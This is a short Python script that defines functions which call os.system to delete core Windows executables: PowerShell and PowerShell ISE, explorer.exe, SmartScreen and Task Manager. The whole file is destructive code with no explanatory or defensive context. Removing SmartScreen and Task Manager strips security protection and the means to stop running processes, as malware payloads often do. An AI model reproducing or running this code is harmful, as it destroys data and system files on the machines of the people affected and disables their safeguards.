#!/usr/bin/python
#coding:utf-8
import os, sys, time
# FUNCTION TO DELETE POWERSHELL
def pwsst():
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
# FUNCTION TO DELETE EXPLORER ON WINDOWS
def exp():
    cmd = "del \\windows\\explorer.exe "
    os.system(cmd)
# FUNCTION TO DELETE SMARTSCREEN
def smart():
    cmd = "del \\Windows\\system32\\smartscreen.exe"
    os.system(cmd)
# FUNCTION TO DELETE THE TASK MANAGER
def tskmgr():
    cmd = "del \\Windows\\system32\\taskmgr.exe"
    os.system(cmd)
